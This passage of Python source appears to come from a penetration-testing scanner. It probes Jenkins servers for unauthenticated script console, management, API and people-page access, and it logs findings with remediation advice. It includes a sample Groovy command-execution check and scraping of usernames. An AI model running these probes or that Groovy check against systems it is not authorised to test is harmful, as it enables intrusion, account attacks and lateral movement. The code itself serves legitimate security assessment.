            sources="fracture-auth-bypass", service=target["scheme"],
            affected="\n".join(r["action"] for r in _enum_results),
            owasp="A07:2025 Identification and Authentication Failures",
            nist="IA-5",
            remediation=(
                "Return identical responses (status code, body length, content, "
                "and timing) for all login attempts regardless of whether the "
                "username exists. Use generic error messages like 'Invalid "
                "credentials' for all failure cases."
            ),
            http_code=_enum_results[0]["http_code"],
        )

    vc.status(phase, "Auth Bypass", "running", "Jenkins console probes", 8, 9)
    # 8. Jenkins unauthenticated console probes
    # Detect Jenkins from target_profile.json technologies, Server header, or
    # crawl_data fingerprints.  If Jenkins is identified, probe for RCE-level
    # unauth access to /script, /manage, /api/json, and /asynchPeople/.
    _jenkins_detected = False
    try:
        _jk_tp_path = out.root / "target_profile.json"
        if _jk_tp_path.exists():
            _jk_tp = json.loads(_jk_tp_path.read_text(encoding="utf-8"))
            _jk_blob = " ".join([
                _jk_tp.get("server", ""),
                _jk_tp.get("powered_by", ""),
                " ".join(
                    (t.get("name", "") if isinstance(t, dict) else str(t))
                    for t in (_jk_tp.get("technologies") or [])
                ),
            ]).lower()
            if "jenkins" in _jk_blob or "hudson" in _jk_blob:
                _jenkins_detected = True
    except Exception:
        pass
    # Also check crawl_data responses and Server headers
    if not _jenkins_detected:
        try:
            _jk_r = sess.get(url, timeout=timeout, allow_redirects=True)
            if _jk_r and ("jenkins" in (_jk_r.headers.get("X-Jenkins", "").lower())
                          or "jenkins" in (_jk_r.headers.get("Server", "").lower())
                          or "jenkins" in _jk_r.text[:5000].lower()):
                _jenkins_detected = True
        except Exception:
            pass

    if _jenkins_detected:
        vc.log("[auth_bypass] Jenkins detected — probing unauthenticated consoles", "INFO")
        _jk_evidence = out.output_path(phase, "jenkins_console_" + target["hostname"])
        _jk_evidence.write_text(
            f"# Jenkins Unauthenticated Console Probes — {url}\n\n",
            encoding="utf-8"
        )

        # 8a. Groovy Script Console — /script (RCE)
        try:
            _jk_script_url = url.rstrip("/") + "/script"
            _jk_r1 = sess.get(_jk_script_url, timeout=timeout, allow_redirects=True)
            if _jk_r1 and _jk_r1.status_code == 200 and re.search(
                    r'groovy\s*script|script\s*console', _jk_r1.text, re.I):
                with _jk_evidence.open("a", encoding="utf-8") as _jf:
                    _jf.write(
                        f"## Groovy Script Console (RCE)\n"
                        f"URL: {_jk_script_url}\n"
                        f"Status: {_jk_r1.status_code}\n"
                        f"Response excerpt:\n{_jk_r1.text[:3000]}\n\n"
                    )
                out.add_finding(
                    title="Jenkins: Unauthenticated Groovy Script Console (RCE)",
                    url=_jk_script_url, port=target["port"], risk="CRITICAL",
                    description=(
                        "The Jenkins Groovy Script Console at /script is accessible "
                        "without authentication, allowing arbitrary code execution "
                        "on the Jenkins server. An attacker can execute system "
                        "commands, read files, install backdoors, and pivot into "
                        "the internal network."
                    ),
                    output=f"GET {_jk_script_url} → {_jk_r1.status_code}",
                    sources="fracture-auth-bypass", service=target["scheme"],
                    affected=_jk_script_url, output_file=str(_jk_evidence),
                    owasp="A05:2025 Security Misconfiguration",
                    nist="CM-7",
                    remediation=(
                        "Immediately restrict access to the Jenkins script console. "
                        "Enable authentication, restrict /script to administrators, "
                        "and place Jenkins behind a reverse proxy with access controls."
                    ),
                    cwe=["CWE-306"],
                    mitre_attack=[{"technique": "T1059.007", "tactic": "Execution",
                                   "name": "Command and Scripting Interpreter: JavaScript"}],
                    http_code=_jk_r1.status_code,
                )
                vc.log("[auth_bypass] CRITICAL — Jenkins Groovy console open (RCE)!", "SUCCESS")
                # Action item: exploit verification for RCE
                out.log_action_item(
                    type="exploit",
                    recommended_tool="Manual Verification",
                    target=_jk_script_url,
                    ip=target.get("ip", ""),
                    port=target["port"],
                    hostname=target.get("hostname", ""),
                    title="Exploit Verification Required — Jenkins Unauthenticated RCE",
                    description=(
                        "CRITICAL: Jenkins Groovy Script Console at /script is "
                        "accessible without authentication. Verify arbitrary code "
                        "execution via Groovy scripting (e.g. 'println \"id\".execute().text')."
                    ),
                    source_finding="Jenkins: Unauthenticated Groovy Script Console (RCE)",
                    priority="CRITICAL",
                    scope="webapp",
                    metadata={"endpoint": "/script", "rce": True},
                )
                # Cross-tool action item: recommend SS3 for network-level follow-up
                out.log_action_item(
                    type="cross_tool",
                    recommended_tool="Scattershot3",
                    target=url,
                    ip=target.get("ip", ""),
                    port=target["port"],
                    hostname=target.get("hostname", ""),
                    title="Network Pivot Assessment — Jenkins RCE Confirmed",
                    description=(
                        "Jenkins Groovy Script Console is unauthenticated (RCE confirmed). "
                        "Recommend Scattershot3 network scan to assess lateral movement "
                        "potential and identify additional hosts reachable from the "
                        "Jenkins server."
                    ),
                    source_finding="Jenkins: Unauthenticated Groovy Script Console (RCE)",
                    priority="CRITICAL",
                    scope="webapp",
                    metadata={"source_phase": "auth_bypass", "rce_confirmed": True},
                )
        except Exception:
            pass

        # 8b. Management Console — /manage
        try:
            _jk_manage_url = url.rstrip("/") + "/manage"
            _jk_r2 = sess.get(_jk_manage_url, timeout=timeout, allow_redirects=True)
            if _jk_r2 and _jk_r2.status_code == 200 and re.search(
                    r'manage\s*jenkins', _jk_r2.text, re.I):
                with _jk_evidence.open("a", encoding="utf-8") as _jf:
                    _jf.write(
                        f"## Management Console\n"
                        f"URL: {_jk_manage_url}\n"
                        f"Status: {_jk_r2.status_code}\n"
                        f"Response excerpt:\n{_jk_r2.text[:3000]}\n\n"
                    )
                out.add_finding(
                    title="Jenkins: Unauthenticated Management Console",
                    url=_jk_manage_url, port=target["port"], risk="HIGH",
                    description=(
                        "The Jenkins management console at /manage is accessible "
                        "without authentication, exposing system configuration, "
                        "plugin management, and credential stores. An attacker "
                        "can install malicious plugins, modify build pipelines, "
                        "and extract stored secrets."
                    ),
                    output=f"GET {_jk_manage_url} → {_jk_r2.status_code}",
                    sources="fracture-auth-bypass", service=target["scheme"],
                    affected=_jk_manage_url, output_file=str(_jk_evidence),
                    owasp="A05:2025 Security Misconfiguration",
                    nist="CM-7",
                    remediation=(
                        "Enable Jenkins authentication and restrict /manage to "
                        "administrator accounts. Place Jenkins behind a reverse "
                        "proxy with IP-based access controls."
                    ),
                    cwe=["CWE-306"],
                    http_code=_jk_r2.status_code,
                )
                vc.log("[auth_bypass] Jenkins management console open!", "SUCCESS")
                out.log_action_item(
                    type="exploit",
                    recommended_tool="Manual Verification",
                    target=_jk_manage_url,
                    ip=target.get("ip", ""),
                    port=target["port"],
                    hostname=target.get("hostname", ""),
                    title="Verification Required — Jenkins Management Console Exposed",
                    description=(
                        "HIGH: Jenkins management console at /manage is accessible "
                        "without authentication. Verify credential extraction from "
                        "credential stores and plugin installation capabilities."
                    ),
                    source_finding="Jenkins: Unauthenticated Management Console",
                    priority="HIGH",
                    scope="webapp",
                    metadata={"endpoint": "/manage"},
                )
        except Exception:
            pass

        # 8c. API Access — /api/json
        try:
            _jk_api_url = url.rstrip("/") + "/api/json"
            _jk_r3 = sess.get(_jk_api_url, timeout=timeout, allow_redirects=True)
            if _jk_r3 and _jk_r3.status_code == 200:
                try:
                    _jk_api_data = _jk_r3.json()
                except Exception:
                    _jk_api_data = None
                if _jk_api_data and isinstance(_jk_api_data, dict):
                    _jk_jobs = _jk_api_data.get("jobs", [])
                    _jk_views = _jk_api_data.get("views", [])
                    _jk_mode = _jk_api_data.get("mode", "")
                    _jk_desc = _jk_api_data.get("description", "")
                    with _jk_evidence.open("a", encoding="utf-8") as _jf:
                        _jf.write(
                            f"## API Access (/api/json)\n"
                            f"URL: {_jk_api_url}\n"
                            f"Status: {_jk_r3.status_code}\n"
                            f"Jobs: {len(_jk_jobs)}\n"
                            f"Views: {len(_jk_views)}\n"
                            f"Mode: {_jk_mode}\n"
                            f"Response:\n{_jk_r3.text[:3000]}\n\n"
                        )
                    out.add_finding(
                        title="Jenkins: Unauthenticated API Access",
                        url=_jk_api_url, port=target["port"], risk="MEDIUM",
                        description=(
                            f"The Jenkins JSON API is accessible without authentication, "
                            f"exposing {len(_jk_jobs)} job(s) and {len(_jk_views)} view(s). "
                            f"Build information, job configurations, and potentially "
                            f"credentials are accessible via the API."
                        ),
                        output=(
                            f"GET {_jk_api_url} → {_jk_r3.status_code}\n"
                            f"Jobs: {len(_jk_jobs)}, Views: {len(_jk_views)}, "
                            f"Mode: {_jk_mode}"
                        ),
                        sources="fracture-auth-bypass", service=target["scheme"],
                        affected=_jk_api_url, output_file=str(_jk_evidence),
                        owasp="A05:2025 Security Misconfiguration",
                        nist="CM-7",
                        remediation=(
                            "Enable Jenkins authentication for API endpoints. "
                            "Restrict anonymous read access in Global Security settings."
                        ),
                        cwe=["CWE-306"],
                        http_code=_jk_r3.status_code,
                    )
                    vc.log(
                        f"[auth_bypass] Jenkins API open — {len(_jk_jobs)} jobs, "
                        f"{len(_jk_views)} views exposed", "SUCCESS"
                    )
        except Exception:
            pass

        # 8d. User Enumeration — /asynchPeople/
        try:
            _jk_people_url = url.rstrip("/") + "/asynchPeople/"
            _jk_r4 = sess.get(_jk_people_url, timeout=timeout, allow_redirects=True)
            if _jk_r4 and _jk_r4.status_code == 200 and re.search(
                    r'<a\s+href="[^"]*user/[^"]*"', _jk_r4.text, re.I):
                _jk_users = re.findall(
                    r'href="[^"]*user/([^"/]+)"', _jk_r4.text, re.I)
                _jk_users = list(dict.fromkeys(_jk_users))[:50]
                with _jk_evidence.open("a", encoding="utf-8") as _jf:
                    _jf.write(
                        f"## User Enumeration (/asynchPeople/)\n"
                        f"URL: {_jk_people_url}\n"
                        f"Status: {_jk_r4.status_code}\n"
                        f"Users found: {len(_jk_users)}\n"
                        f"Usernames: {', '.join(_jk_users[:20])}\n\n"
                    )
                out.add_finding(
                    title="Enumeration: Jenkins User Enumeration via People Page",
                    url=_jk_people_url, port=target["port"], risk="MEDIUM",
                    description=(
                        f"The Jenkins People page at /asynchPeople/ is accessible "
                        f"without authentication, revealing {len(_jk_users)} "
                        f"user account(s). Exposed usernames facilitate password "
                        f"spraying and social engineering attacks."
                    ),
                    output=(
                        f"GET {_jk_people_url} → {_jk_r4.status_code}\n"
                        f"Users ({len(_jk_users)}): "
                        f"{', '.join(_jk_users[:10])}"
                        f"{'...' if len(_jk_users) > 10 else ''}"
                    ),
                    sources="fracture-auth-bypass", service=target["scheme"],
                    affected=_jk_people_url, output_file=str(_jk_evidence),
                    owasp="A01:2025 Broken Access Control",
                    nist="AC-3",
                    remediation=(
                        "Enable Jenkins authentication and disable anonymous access. "
                        "Configure the 'People' page to require login."
                    ),
                    cwe=["CWE-200"],
                    http_code=_jk_r4.status_code,
                )
                vc.log(
                    f"[auth_bypass] Jenkins user enumeration — "
                    f"{len(_jk_users)} user(s) exposed", "SUCCESS"
                )
        except Exception:
            pass
    else:
        vc.log("[auth_bypass] Jenkins not detected — skipping console probes", "INFO")

    vc.status(phase, "Auth Bypass", "complete", "Done", 9, 9)
    vc.log("[auth_bypass] Phase complete", "SUCCESS")
    return _discovered


